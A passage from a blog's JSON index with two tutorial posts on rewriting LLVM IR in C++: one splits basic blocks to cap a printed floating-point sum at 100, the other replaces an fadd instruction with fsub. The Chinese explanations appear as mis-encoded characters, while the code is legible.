-Learn-Work2","slug":"LLVM-Learn-Work2","date":"2022-05-03T14:10:20.000Z","updated":"2022-05-03T14:16:35.049Z","comments":true,"path":"posts/39ba32b9/","link":"","permalink":"https://www.sizaif.com/posts/39ba32b9/","excerpt":"","text":"LLVM -Learn-Work2 @2022-04-28 03:05:00 @sizaif Work2ï¼šå¦‚æœåŠ æ³•ç»“æœå¤§äº 100ï¼Œåˆ™å°†ç»“æœæ”¹ä¸º 100ã€‚(åŸºæœ¬å—æ“ä½œ) //main.c #define _GNU_SOURCE #include &lt;stdio.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;stdlib.h> int main() &#123; puts(\"plz input two numbers\"); size_t bufsize = 100; char* buf = malloc(bufsize); getline(&amp;buf, &amp;bufsize, stdin); double f1 = atof(buf); getline(&amp;buf, &amp;bufsize, stdin); double f2 = atof(buf); printf(\"%.2f + %.2f = %.2f \\n\", f1, f2, f1+f2); free(buf); return 0; &#125; ä¸€) æ€è·¯ æ•´ä½“æ€æƒ³ä¸ºï¼š è·å¾—faddæŒ‡ä»¤çš„ç»“æœï¼Œifè¯­å¥åˆ¤æ–­ä¸€ä¸‹ç»“æœä¸100çš„å¤§å°ï¼Œå¦‚æœå¤§äº100ï¼Œåˆ™ä¿®æ”¹æŒ‡ä»¤ä¸º100 ä¸€ç§æ€æƒ³ï¼š â€‹ å…ˆæ‰¾åˆ°fadd æŒ‡ä»¤ä¸faddæŒ‡ä»¤çš„åä¸€ä¸ªæŒ‡ä»¤call printf æ ¹æ®æºç ï¼Œmain åªæœ‰ä¸€ä¸ªé»˜è®¤åŸºæœ¬å— åœ¨fadd æŒ‡ä»¤å‰ï¼Œå…ˆå­˜å…¥å¸¸æ•°å€¼100.0 åœ¨fadd æŒ‡ä»¤åé¢(call printfæŒ‡ä»¤å‰æ·»åŠ  fcmpåˆ¤æ–­æŒ‡ä»¤ ä»call printfæŒ‡ä»¤å¼€å§‹å°†é»˜è®¤å—ä¸€åˆ†ä¸º: defaut å—å’Œdefaut_ret å— æ’å…¥ä¸¤ä¸ªæ–°çš„åŸºæœ¬å—change_prt å’Œ defaut_prt change_prtåŸºæœ¬å—çš„å†…å®¹ä¸ºè¯»å–100, è°ƒç”¨printfå‡½æ•°è¾“å‡ºæ–°çš„å€¼ï¼Œè·³è½¬åˆ°defaut_ret freeå†…å­˜ defaut_prtåŸºæœ¬å—çš„å†…å®¹ä¸ºè¯»å–faddçš„ç»“æœï¼Œè°ƒç”¨printfå‡½æ•°è¾“å‡ºï¼Œè·³è½¬åˆ°defaut_ret freeå†…å­˜ å…³ç³»å›¾å¦‚ä¸‹ï¼š åŸæ¥IRä»£ç  %20 = load double, double* %5, align 8 %21 = fadd double %19, %20 %22 = call i32 (i8*, ...) @printf(8* noundef getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0), double noundef %17, double noundef %18, double noundef %21) %23 = load i8*, i8** %3, align 8 call void @free(i8* noundef %23) #4 ret i32 0 ç›®æ ‡IRä»£ç  Â·Â·Â·Â·Â· store double %15, double* %4, align 8 %16 = load double, double* %3, align 8 %17 = load double, double* %4, align 8 %18 = load double, double* %3, align 8 %19 = load double, double* %4, align 8 %ina1 = alloca double, align 8 store double 1.000000e+02, double* %ina1, align 8 %20 = fadd double %18, %19 %inf1 = fcmp ugt double %20, 1.000000e+02 br i1 %inf1, label %change_prt, label %defaut_prt defaut_ret: ; preds = %defaut_prt, %change_prt %21 = load i8*, i8** %2, align 8 call void @free(i8* noundef %21) #4 ret i32 0 change_prt: ; preds = %defaut %22 = load double, double* %ina1, align 8 %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @0, i32 0, i32 0), double %16, double %17, double %22) br label %defaut_ret defaut_prt: ; preds = %defaut %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @0, i32 0, i32 0), double %16, double %17, double %20) br label %defaut_ret &#125; Â·Â·Â·Â·Â· äºŒ) æ‰§è¡Œ 2.1 åˆå§‹åŒ–(å‰ç½®) LLVMContext context; IRBuilder&lt;> builder(context); std::unique_ptr&lt;Module> M; std::unique_ptr&lt;MIRParser> MIR; SMDiagnostic Err; /** * #include \"llvm/IRReader/IRReader.h\" * 2022-04-26 03:04:32 * TODO: * from IR file get Moudle class * */ M = parseIRFile(StringRef(argv[1]),Err,context); if(M)&#123; std::cout&lt;&lt;\"debug: M is not null\"&lt;&lt;std::endl; // M->print(llvm::outs(),nullptr); &#125; else&#123; std::cout&lt;&lt;\"M is null\"&lt;&lt;std::endl; Err.print(argv[0],errs()); &#125; 2.2 æ‰¾åˆ°faddæŒ‡ä»¤å¹¶æ·»åŠ ç›¸å…³å¿…è¦æŒ‡ä»¤ /** * 2022-04-26 03:25:52 * TODO: * è·å–mainå‡½æ•° * */ auto main_fn = M->getFunction(StringRef(\"main\")); /** * 2022-04-28 02:14:46 * TODO: * æ‰¾åˆ°faddæŒ‡ä»¤,ä¸faddçš„åä¸€ä¸ªæŒ‡ä»¤ * */ Instruction *in_fadd,*in_prt; for (inst_iterator I = inst_begin(*main_fn), E = inst_end(*main_fn); I != E; ++I)&#123; if(I->isBinaryOp() &amp;&amp; I->getOpcode()==Instruction::FAdd)&#123; // outs() &lt;&lt; *I &lt;&lt; \"\\n\"; in_fadd = &amp;*I; in_prt = &amp;*(I.operator++()); &#125; &#125; /** * 2022-04-28 02:42:32 * TODO: * %20 = load double, double* %5, align 8 * %21 = fadd double %19, %20 * åœ¨faddæŒ‡ä»¤å‰é¢ * æ·»åŠ ä»¥ä¸‹ä¸¤ä¸ªæŒ‡ä»¤: * &lt;x> = alloca double, align 8 * store double 1.000000e+02, double* &lt;x>, align 8 * * */ auto f32 = builder.getDoubleTy(); auto const100 = ConstantFP::get(f32,double(100)); builder.SetInsertPoint(in_fadd); auto in_alloc = builder.CreateAlloca(f32,0,\"ina1\"); auto in_store = builder.CreateStore(const100,in_alloc); /** * 2022-05-03 12:47:30 * TODO: * åœ¨printfæŒ‡ä»¤å‰æ·»åŠ æ¡ä»¶åˆ¤æ–­(fcmp)æŒ‡ä»¤ * %21 = call i32 (i8*, ...) @printf(i8* noundef Â·Â·Â·Â· * fcmp: * &lt;x> = fcmp ugt double &lt;fadd>, 1.000000e+02 * */ builder.SetInsertPoint(in_prt); auto in_fcmp = builder.CreateFCmpUGT(in_fadd,const100,\"inf1\"); 2.3 åˆ‡å‰²åŸºæœ¬å— /** * 2022-05-03 12:49:38 * TODO: * å°†mainä¸­é»˜è®¤å—åˆ†ä¸º2å—: ä¸»ä½“å—å’Œé»˜è®¤retå— * å¹¶æ·»åŠ ä¸¤ä¸ªæ–°å—: ä¿®æ”¹è¾“å‡ºå—å’Œé»˜è®¤è¾“å‡ºå— * */ auto oldblk = &amp;main_fn->getEntryBlock(); oldblk->setName(\"defaut\"); auto bb2 = SplitBlock(oldblk,in_prt); if(!bb2)&#123; errs()&lt;&lt;\"debug: split block wrong! \\n\"; &#125;else&#123; bb2->setName(\"defaut_ret\"); &#125; BasicBlock *change_prt = BasicBlock::Create(context, \"change_prt\", main_fn); BasicBlock *defaut_prt = BasicBlock::Create(context, \"defaut_prt\", main_fn); åˆ‡å‰²åŸºæœ¬å—SplitBlock(oldblk,in_prt);å‡½æ•°ï¼Œæ­¤æ—¶åˆ‡å‰²æ•ˆæœå¦‚ä¸‹ï¼š # auto bb2 = SplitBlock(oldblk,in_prt); Â·Â·Â·Â·Â·Â·Â· store double %15, double* %4, align 8 %16 = load double, double* %3, align 8 %17 = load double, double* %4, align 8 %18 = load double, double* %3, align 8 %19 = load double, double* %4, align 8 %ina1 = alloca double, align 8 store double 1.000000e+02, double* %ina1, align 8 %20 = fadd double %18, %19 %inf1 = fcmp ugt double %20, 1.000000e+02 br label %.split .split: ; preds = %0 %21 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0), double noundef %18, double noundef %19, double noundef %20) %22 = load i8*, i8** %3, align 8 call void @free(i8* noundef %23) #4 ret i32 0 &#125; è¡¥å……åæ•ˆæœå¦‚ä¸‹ï¼š defuat Â·Â·Â·Â·Â· store double %15, double* %4, align 8 %16 = load double, double* %3, align 8 %17 = load double, double* %4, align 8 %18 = load double, double* %3, align 8 %19 = load double, double* %4, align 8 %ina1 = alloca double, align 8 store double 1.000000e+02, double* %ina1, align 8 %20 = fadd double %18, %19 %inf1 = fcmp ugt double %20, 1.000000e+02 br label %.split defaut_ret: ; preds = %defaut %21 = load i8*, i8** %2, align 8 call void @free(i8* noundef %21) #4 ret i32 0 change_prt: ; defaut_prt: ; &#125; Â·Â·Â·Â·Â· 2.4 åœ¨å—ä¸­å¡«å……å†…å®¹ /** * 2022-05-03 12:51:10 * TODO: * ä¿®æ”¹è¾“å‡ºå—ï¼š * è¯»å–å‰é¢å­˜å‚¨é»˜è®¤100å€¼, * æ„é€ printfå‡½æ•°è¾“å‡º * */ builder.SetInsertPoint(change_prt); auto in_load = builder.CreateLoad(f32,in_alloc); auto i32p = builder.getIntPtrTy(M->getDataLayout(),0); auto printf_prototype = FunctionType::get(i32p, true); auto printf_fn = M->getFunction(\"printf\"); if(!printf_fn)&#123; printf_fn = Function::Create(printf_prototype,Function::ExternalLinkage, \"printf\", M.get()); &#125; auto format_str = builder.CreateGlobalStringPtr(\"%.2f + %.2f = %.2f \\n\"); builder.CreateCall(printf_fn, &#123;format_str,in_prt->getOperand(1),in_prt->getOperand(2),in_load&#125;); builder.CreateBr(bb2); /** * 2022-05-03 12:51:57 * TODO: * é»˜è®¤è¾“å‡ºå—ï¼š * æ„é€ printfé»˜è®¤å‡½æ•°è¾“å‡º * */ builder.SetInsertPoint(defaut_prt); builder.CreateCall(printf_fn, &#123;format_str,in_prt->getOperand(1),in_prt->getOperand(2),in_fadd&#125;); builder.CreateBr(bb2); /** * 2022-05-03 12:52:18 * TODO: * æ„é€ æ–°çš„brè·³è½¬æŒ‡ä»¤æ›¿æ¢é»˜è®¤åˆ†å—æŒ‡ä»¤ * br label defaue_ret -> br &lt;cond> label A lable B * */ auto old_cond_br = &amp;*(oldblk->getIterator()->rbegin()); auto new_cond_br = BranchInst::Create(change_prt,defaut_prt,in_fcmp); ReplaceInstWithInst(old_cond_br,new_cond_br); /** * 2022-05-03 14:54:46 * TODO: * åˆ é™¤åŸå…ˆprintfçš„è°ƒç”¨æŒ‡ä»¤ * */ in_prt->eraseFromParent(); 2.5 ä¿®æ”¹åModuleéªŒè¯å¹¶å†™å…¥æ–‡ä»¶ä¸­ /** * #include \"llvm/IR/Verifier.h\" * 2022-05-02 11:43:34 * TODO: * ä¿®æ”¹å®ŒModuleåè¿›è¡ŒéªŒè¯Moduleçš„å®Œæ•´æ€§ * verifyModule(*M,&amp;errs()): true if the module is broken. * */ if(!llvm::verifyModule(*M,&amp;errs()))&#123; outs()&lt;&lt;\"debug: Module verify is ok \\n\"; // M->print(outs(),nullptr); &#125; /** * #include \"llvm/Bitcode/BitcodeWriter.h\" * 2022-05-03 12:55:33 * TODO: * å°†ä¿®æ”¹åçš„IR å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ï¼Œ æ‰§è¡Œ * */ std::error_code EC; llvm::raw_fd_ostream OS(\"aftermain.bc\", EC,llvm::sys::fs::OpenFlags()); llvm::WriteBitcodeToFile(*M,OS,true); OS.flush(); 2.x) å…¨éƒ¨æºç  /** * 2022-04-26 01:02:37 * 2022-05-03 15:55:43 * sizaif * * clang++ $(llvm-config --cxxflags --ldflags --system-libs --libs) -o main main.cpp * ./main main.ll * lli aftermain.bc * */ #include \"llvm/Transforms/Utils/BasicBlockUtils.h\" #include &lt;llvm/IR/IRBuilder.h> #include \"llvm/IR/LLVMContext.h\" #include \"llvm/IR/Module.h\" #include \"llvm/IR/InstIterator.h\" #include \"llvm/IR/Instruction.h\" #include \"llvm/IR/Instructions.h\" #include \"llvm/IR/InstrTypes.h\" #include \"llvm/IR/Verifier.h\" #include \"llvm/IRReader/IRReader.h\" #include \"llvm/CodeGen/MIRParser/MIRParser.h\" #include \"llvm/Support/InitLLVM.h\" #include \"llvm/Support/Debug.h\" #include \"llvm/Support/TargetSelect.h\" #include \"llvm/Support/SourceMgr.h\" #include &lt;llvm/Support/raw_os_ostream.h> #include \"llvm/Bitcode/BitcodeWriter.h\" #include &lt;iostream> #include &lt;string> #include &lt;fstream> #include &lt;cstdio> using namespace llvm; int main(int argc,char **argv)&#123; LLVMContext context; IRBuilder&lt;> builder(context); std::unique_ptr&lt;Module> M; std::unique_ptr&lt;MIRParser> MIR; SMDiagnostic Err; /** * #include \"llvm/IRReader/IRReader.h\" * 2022-04-26 03:04:32 * TODO: * from IR file get Moudle class * */ M = parseIRFile(StringRef(argv[1]),Err,context); if(M)&#123; std::cout&lt;&lt;\"debug: M is not null\"&lt;&lt;std::endl; // M->print(llvm::outs(),nullptr); &#125; else&#123; std::cout&lt;&lt;\"M is null\"&lt;&lt;std::endl; Err.print(argv[0],errs()); &#125; /** * 2022-04-26 03:25:52 * TODO: * è·å–mainå‡½æ•° * */ auto main_fn = M->getFunction(StringRef(\"main\")); /** * 2022-04-28 02:14:46 * TODO: * æ‰¾åˆ°faddæŒ‡ä»¤,ä¸faddçš„åä¸€ä¸ªæŒ‡ä»¤ * */ Instruction *in_fadd,*in_prt; for (inst_iterator I = inst_begin(*main_fn), E = inst_end(*main_fn); I != E; ++I)&#123; if(I->isBinaryOp() &amp;&amp; I->getOpcode()==Instruction::FAdd)&#123; // outs() &lt;&lt; *I &lt;&lt; \"\\n\"; in_fadd = &amp;*I; in_prt = &amp;*(I.operator++()); &#125; /** * 2022-04-28 02:42:32 * TODO: * %20 = load double, double* %5, align 8 * %21 = fadd double %19, %20 * åœ¨faddæŒ‡ä»¤å‰é¢ * æ·»åŠ ä»¥ä¸‹ä¸¤ä¸ªæŒ‡ä»¤: * &lt;x> = alloca double, align 8 * store double 1.000000e+02, double* &lt;x>, align 8 * * */ auto f32 = builder.getDoubleTy(); auto const100 = ConstantFP::get(f32,double(100)); builder.SetInsertPoint(in_fadd); auto in_alloc = builder.CreateAlloca(f32,0,\"ina1\"); auto in_store = builder.CreateStore(const100,in_alloc); /** * 2022-05-03 12:47:30 * TODO: * åœ¨printfæŒ‡ä»¤å‰æ·»åŠ æ¡ä»¶åˆ¤æ–­(fcmp)æŒ‡ä»¤ * %21 = call i32 (i8*, ...) @printf(i8* noundef Â·Â·Â·Â· * fcmp: * &lt;x> = fcmp ugt double &lt;fadd>, 1.000000e+02 * */ builder.SetInsertPoint(in_prt); auto in_fcmp = builder.CreateFCmpUGT(in_fadd,const100,\"inf1\"); outs()&lt;&lt;\"debug: fadd op : \"&lt;&lt;*in_fadd&lt;&lt;\" \\n\"; outs()&lt;&lt;\"debug: alloc op : \"&lt;&lt;*in_alloc&lt;&lt;\" \\n\"; outs()&lt;&lt;\"debug: store op : \"&lt;&lt;*in_store&lt;&lt;\" \\n\"; outs()&lt;&lt;\"debug: fcmp op : \"&lt;&lt;*in_fcmp&lt;&lt;\" \\n\"; /** * 2022-05-03 12:49:38 * TODO: * å°†mainä¸­é»˜è®¤å—åˆ†ä¸º2å—: ä¸»ä½“å—å’Œé»˜è®¤retå— * å¹¶æ·»åŠ ä¸¤ä¸ªæ–°å—: ä¿®æ”¹è¾“å‡ºå—å’Œé»˜è®¤è¾“å‡ºå— * */ auto oldblk = &amp;main_fn->getEntryBlock(); oldblk->setName(\"defaut\"); auto bb2 = SplitBlock(oldblk,in_prt); if(!bb2)&#123; errs()&lt;&lt;\"debug: split block wrong! \\n\"; &#125;else&#123; bb2->setName(\"defaut_ret\"); &#125; BasicBlock *change_prt = BasicBlock::Create(context, \"change_prt\", main_fn); BasicBlock *defaut_prt = BasicBlock::Create(context, \"defaut_prt\", main_fn); /** * 2022-05-03 12:51:10 * TODO: * ä¿®æ”¹è¾“å‡ºå—ï¼š * è¯»å–å‰é¢å­˜å‚¨é»˜è®¤100å€¼, * æ„é€ printfå‡½æ•°è¾“å‡º * */ builder.SetInsertPoint(change_prt); auto in_load = builder.CreateLoad(f32,in_alloc); auto i32p = builder.getIntPtrTy(M->getDataLayout(),0); auto printf_prototype = FunctionType::get(i32p, true); auto printf_fn = M->getFunction(\"printf\"); if(!printf_fn)&#123; printf_fn = Function::Create(printf_prototype,Function::ExternalLinkage, \"printf\", M.get()); &#125; auto format_str = builder.CreateGlobalStringPtr(\"%.2f + %.2f = %.2f \\n\"); builder.CreateCall(printf_fn, &#123;format_str,in_prt->getOperand(1),in_prt->getOperand(2),in_load&#125;); builder.CreateBr(bb2); /** * 2022-05-03 12:51:57 * TODO: * é»˜è®¤è¾“å‡ºå—ï¼š * æ„é€ printfé»˜è®¤å‡½æ•°è¾“å‡º * */ builder.SetInsertPoint(defaut_prt); builder.CreateCall(printf_fn, &#123;format_str,in_prt->getOperand(1),in_prt->getOperand(2),in_fadd&#125;); builder.CreateBr(bb2); /** * 2022-05-03 12:52:18 * TODO: * æ„é€ æ–°çš„brè·³è½¬æŒ‡ä»¤æ›¿æ¢é»˜è®¤åˆ†å—æŒ‡ä»¤ * br label defaue_ret -> br &lt;cond> label A lable B * */ auto old_cond_br = &amp;*(oldblk->getIterator()->rbegin()); outs()&lt;&lt;\"debug: old cond br : \"&lt;&lt;*old_cond_br&lt;&lt;\" \\n\"; auto new_cond_br = BranchInst::Create(change_prt,defaut_prt,in_fcmp); outs()&lt;&lt;\"debug: new cond br : \"&lt;&lt;*new_cond_br&lt;&lt;\" \\n\"; ReplaceInstWithInst(old_cond_br,new_cond_br); /** * 2022-05-03 14:54:46 * TODO: * åˆ é™¤åŸå…ˆprintfçš„è°ƒç”¨æŒ‡ä»¤ * */ in_prt->eraseFromParent(); /** * #include \"llvm/IR/Verifier.h\" * 2022-05-02 11:43:34 * TODO: * ä¿®æ”¹å®ŒModuleåè¿›è¡ŒéªŒè¯Moduleçš„å®Œæ•´æ€§ * verifyModule(*M,&amp;errs()): true if the module is broken. * */ if(!llvm::verifyModule(*M,&amp;errs()))&#123; outs()&lt;&lt;\"debug: Module verify is ok \\n\"; // M->print(outs(),nullptr); &#125; /** * #include \"llvm/Bitcode/BitcodeWriter.h\" * 2022-05-03 12:55:33 * TODO: * å°†ä¿®æ”¹åçš„IR å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ï¼Œ æ‰§è¡Œ * */ std::error_code EC; llvm::raw_fd_ostream OS(\"aftermain.bc\", EC,llvm::sys::fs::OpenFlags()); llvm::WriteBitcodeToFile(*M,OS,true); OS.flush(); return 0; &#125; 2.6 æ•ˆæœ ä¸‰) æ€»ç»“ åŸºæœ¬å—æ“ä½œæ¶‰åŠåˆ°ï¼š å¯¹åŸºæœ¬å—çš„éå†(è¿­ä»£å™¨åº”ç”¨) å¯¹åŸºæœ¬å—çš„æ‹†åˆ†ï¼Œ åŸºæœ¬å—çš„æ‹†åˆ†æ—¶ï¼Œæ ¹æ®æ–¹æ³•çš„ä½¿ç”¨ä¼šå°†å½“å‰æŒ‡ä»¤æ”¾åˆ°æ–°åŸºæœ¬å—æˆ–æ—§åŸºæœ¬å—(æ³¨æ„åŒºåˆ†) æ„é€ æŒ‡ä»¤æ’å…¥(å¯ä»¥ä½¿ç”¨IRbuilder) æ¥æ„é€ åŸºæœ¬æŒ‡ä»¤ä¸å‡½æ•°æˆ–åŸºæœ¬å— æŒ‡ä»¤åˆ é™¤æ“ä½œ ç›¸åº”çš„ä¿®æ”¹åModule éœ€è¦è¿›è¡ŒéªŒè¯","categories":[{"name":"Master","slug":"Master","permalink":"https://www.sizaif.com/navigation/categories/Master/"},{"name":"LLVM","slug":"Master/LLVM","permalink":"https://www.sizaif.com/navigation/categories/Master/LLVM/"}],"tags":[{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.sizaif.com/tags/fuzzing/"},{"name":"LLVM","slug":"LLVM","permalink":"https://www.sizaif.com/tags/LLVM/"}],"author":"sizaif"},{"title":"LLVM -Learn-Work1","slug":"LLVM-Learn-Work1","date":"2022-05-02T04:16:30.000Z","updated":"2022-05-03T14:17:18.704Z","comments":true,"path":"posts/a0b36303/","link":"","permalink":"https://www.sizaif.com/posts/a0b36303/","excerpt":"","text":"LLVM -Learn-Work1 @2022-04-27 16:33:55 @sizaif Work1ï¼šå°†å…¶æµ®ç‚¹æ•°åŠ æ³•æ”¹ä¸ºå‡æ³•ã€‚(æŒ‡ä»¤æ“ä½œ) //main.c #define _GNU_SOURCE #include &lt;stdio.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;stdlib.h> int main() &#123; puts(\"plz input two numbers\"); size_t bufsize = 100; char* buf = malloc(bufsize); getline(&amp;buf, &amp;bufsize, stdin); double f1 = atof(buf); getline(&amp;buf, &amp;bufsize, stdin); double f2 = atof(buf); printf(\"%.2f + %.2f = %.2f \\n\", f1, f2, f1+f2); free(buf); return 0; &#125; ä¸€) æ€è·¯ ä½¿ç”¨Clangç”ŸæˆIRæ–‡ä»¶ clang -emit-llvm -S main.c -o main.ll ä»IRæ–‡ä»¶ä¸­è¯»å–åˆ°Moduleç±»ä¸­ æ‹¿åˆ°mainå‡½æ•° æ‰¾åˆ°faddæŒ‡ä»¤ï¼Œæ„é€ æ–°çš„fsubæŒ‡ä»¤ï¼Œæ·»åŠ åˆ°å½“å‰faddæŒ‡ä»¤åï¼Œå¹¶åˆ é™¤faddæŒ‡ä»¤ æ³•ä¸€: é€šè¿‡mainå‡½æ•°æ‹¿åˆ°æ‰€æœ‰çš„BasicBlockList() éå†æ‰€æœ‰basicblockå—çš„æ‰€æœ‰æŒ‡ä»¤(Instruction) æŸ¥æ‰¾fadd æŒ‡ä»¤ æ³•äºŒï¼š ä½¿ç”¨æŒ‡ä»¤è¿­ä»£å™¨(inst_iterator),éå†æ‰€æœ‰mainå‡½æ•°çš„æŒ‡ä»¤æ‰¾åˆ°fadd éªŒè¯ä¿®æ”¹åçš„Moduleç±» å­˜å…¥åˆ°æ–°çš„IRæ–‡ä»¶ä¸­,æ‰§è¡Œlli aftermain.bc äºŒ) æ‰§è¡Œ 2.1) ä»IRæ–‡ä»¶ä¸­è¯»å–åˆ°Moduleç±»ä¸­ /** * 2022-04-26 03:20:02 * ä»IRä¸­è·å–Moduleç±» * */ M = parseIRFile(StringRef(argv[1]),Err,context); if(M)&#123; std::cout&lt;&lt;\"M is not null\"&lt;&lt;std::endl; // M->print(llvm::outs(),nullptr); &#125; else&#123; std::cout&lt;&lt;\"M is null\"&lt;&lt;std::endl; Err.print(argv[0],errs()); &#125; 2.2) æ‹¿åˆ°mainå‡½æ•° /** * 2022-04-26 03:25:52 * è·å–mainå‡½æ•° * */ auto main_fn = M->getFunction(StringRef(\"main\")); 2.3) æ‰¾åˆ°faddæŒ‡ä»¤ï¼Œæ„é€ fsubæ›¿æ¢æ‰ æ³•ä¸€ï¼š /** * 2022-04-26 16:56:34 * æ–¹æ³•ä¸€: é€šè¿‡è·å¾—basicblockå—list è¿›è€Œè·å¾—æŒ‡ä»¤ * éå†æŸ¥è¯¢instæŒ‡ä»¤ï¼Œæ‰¾åˆ°fadd * %19 = load double, double* %4, align 8 * %20 = load double, double* %5, align 8 * %21 = fadd double %19, %20 * */ auto bkl = &amp;main_fn->getBasicBlockList(); for (auto it = bkl->begin(); it != bkl->end();it++) &#123; auto instl = &amp;it->getInstList(); for(auto inst = instl->begin(); inst != instl->end();inst++)&#123; if(inst->isBinaryOp() &amp;&amp; inst->getOpcode() == Instruction::FAdd )&#123; new_inst = BinaryOperator::CreateFSub( inst->getOperand(0), inst->getOperand(1), \"\"); old_inst = &amp;*inst; &#125; &#125; &#125; æ³•äºŒï¼š /** * 2022-04-27 15:52:04 * æ–¹æ³•äºŒ: æŒ‡ä»¤è¿­ä»£å™¨éå†æŸ¥æ‰¾ * */ Instruction *old_inst,*new_inst; for (inst_iterator I = inst_begin(*main_fn), E = inst_end(*main_fn); I != E; ++I)&#123; if(I->isBinaryOp() &amp;&amp; I->getOpcode()==Instruction::FAdd)&#123; new_inst = BinaryOperator::CreateFSub( I->getOperand(0), I->getOperand(1), \"\"); old_inst = &amp;*I; &#125; &#125; /** * 2022-05-02 11:49:30 * #include \"llvm/Transforms/Utils/BasicBlockUtils.h\" * æŒ‡ä»¤æ›¿æ¢ * */ outs() &lt;&lt;\" new op: \"&lt;&lt; *new_inst&lt;&lt;\" \\n\"; outs() &lt;&lt;\" old op: \"&lt;&lt; *old_inst &lt;&lt; \" \\n\"; ReplaceInstWithInst(old_inst,new_inst); 2.4) éªŒè¯ä¿®æ”¹åçš„Moduleç±» /** * #include \"llvm/IR/Verifier.h\" * 2022-05-02 11:43:34 * ä¿®æ”¹å®ŒModuleåè¿›è¡ŒéªŒè¯Moduleçš„å®Œæ•´æ€§ * verifyModule(*M,&amp;errs()): true if the module is broken. * å³å¦‚æœéªŒè¯æ­£ç¡®è¿”å›ä¸€ä¸ªfalse, è‹¥å­˜åœ¨é—®é¢˜åˆ™è¿”å›true * */ if(!llvm::verifyModule(*M,&amp;errs()))&#123; outs()&lt;&lt;\"verify is ok \\n\"; // M->print(outs(),nullptr); &#125; 2.5) å­˜å…¥åˆ°æ–°çš„IRæ–‡ä»¶ä¸­,æ‰§è¡Œlli aftermain.ll /** * å°†ä¿®æ”¹åçš„IR å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ï¼Œ æ‰§è¡Œ * */ std::error_code EC; llvm::raw_fd_ostream OS(\"aftermain.bc\", EC,llvm::sys::fs::OpenFlags()); llvm::WriteBitcodeToFile(*M,OS,true); OS.flush(); 2.6) å…¨éƒ¨æºç  /** * 2022-04-26 01:02:37 * sizaif * * clang++ $(llvm-config --cxxflags --ldflags --system-libs --libs) -o main main.cpp * ./main main.ll * lli aftermain.bc * */ #include &lt;llvm/IR/IRBuilder.h> #include \"llvm/IR/LLVMContext.h\" #include \"llvm/IR/Module.h\" #include \"llvm/IR/InstIterator.h\" #include \"llvm/IR/Verifier.h\" #include \"llvm/IR/Instruction.h\" #include \"llvm/IR/DataLayout.h\" #include \"llvm/IRReader/IRReader.h\" #include \"llvm/Support/Debug.h\" #include \"llvm/Support/SourceMgr.h\" #include &lt;llvm/Support/raw_os_ostream.h> #include \"llvm/Support/WithColor.h\" #include \"llvm/Transforms/Utils/BasicBlockUtils.h\" #include \"llvm/Bitcode/BitcodeWriter.h\" #include &lt;iostream> #include &lt;string> #include &lt;fstream> using namespace llvm; int main(int argc,char **argv)&#123; /** * #include &lt;llvm/IR/IRBuilder.h> * #include \"llvm/IR/LLVMContext.h\" * #include \"llvm/IR/Module.h\" * #include \"llvm/Support/SourceMgr.h\" * åˆå§‹åŒ– * */ LLVMContext context; IRBuilder&lt;> builder(context); std::unique_ptr&lt;Module> M; SMDiagnostic Err; /** * 2022-04-26 03:20:02 * ä»IRä¸­è·å–Moduleç±» * */ M = parseIRFile(StringRef(argv[1]),Err,context); if(M)&#123; std::cout&lt;&lt;\"M is not null\"&lt;&lt;std::endl; // M->print(llvm::outs(),nullptr); &#125; else&#123; std::cout&lt;&lt;\"M is null\"&lt;&lt;std::endl; Err.print(argv[0],errs()); &#125; /** * 2022-04-26 03:25:52 * è·å–mainå‡½æ•° * */ auto main_fn = M->getFunction(\"main\"); /** * #include \"llvm/IR/InstIterator.h\" * 2022-04-27 15:52:04 * æ–¹æ³•äºŒ: æŒ‡ä»¤è¿­ä»£å™¨éå†æŸ¥æ‰¾,æ‰¾åˆ°faddæŒ‡ä»¤ * * */ Instruction *old_inst,*new_inst; // for (inst_iterator I = inst_begin(*main_fn), E = inst_end(*main_fn); I != E; ++I)&#123; // if(I->isBinaryOp() &amp;&amp; I->getOpcode()==Instruction::FAdd)&#123; // new_inst = BinaryOperator::CreateFSub( // I->getOperand(0), // I->getOperand(1), // \"\"); // old_inst = &amp;*I; // &#125; // &#125; /** * * 2022-04-26 16:56:34 * æ–¹æ³•ä¸€: é€šè¿‡è·å¾—basicblockå—list è¿›è€Œè·å¾—æŒ‡ä»¤ * éå†æŸ¥è¯¢instæŒ‡ä»¤ï¼Œæ‰¾åˆ°fadd * %19 = load double, double* %4, align 8 * %20 = load double, double* %5, align 8 * %21 = fadd double %19, %20 * */ auto bkl = &amp;main_fn->getBasicBlockList(); for (auto it = bkl->begin(); it != bkl->end();it++) &#123; auto instl = &amp;it->getInstList(); for(auto inst = instl->begin(); inst != instl->end();inst++)&#123; if(inst->isBinaryOp() &amp;&amp; inst->getOpcode() == Instruction::FAdd )&#123; new_inst = BinaryOperator::CreateFSub( inst->getOperand(0), inst->getOperand(1), \"\"); old_inst = &amp;*inst; &#125; &#125; &#125; /** * #include \"llvm/Transforms/Utils/BasicBlockUtils.h\" * 2022-05-02 11:49:30 * æŒ‡ä»¤æ›¿æ¢ * */ outs() &lt;&lt;\" new op: \"&lt;&lt; *new_inst&lt;&lt;\" \\n\"; outs() &lt;&lt;\" old op: \"&lt;&lt; *old_inst &lt;&lt; \" \\n\"; outs()&lt;&lt;\"before replace InstructionCount(): \" &lt;&lt;main_fn->getInstructionCount()&lt;&lt;\"\\n\"; ReplaceInstWithInst(old_inst,new_inst); outs()&lt;&lt;\"after replace InstructionCount(): \" &lt;&lt;main_fn->getInstructionCount()&lt;&lt;\"\\n\"; /** * #include \"llvm/IR/Verifier.h\" * 2022-05-02 11:43:34 * ä¿®æ”¹å®ŒModuleåè¿›è¡ŒéªŒè¯Moduleçš„å®Œæ•´æ€§ * verifyModule(*M,&amp;errs()): true if the module is broken. * */ if(!llvm::verifyModule(*M,&amp;errs()))&#123; outs()&lt;&lt;\"verify is ok \\n\"; M->print(outs(),nullptr); &#125; /** * #include 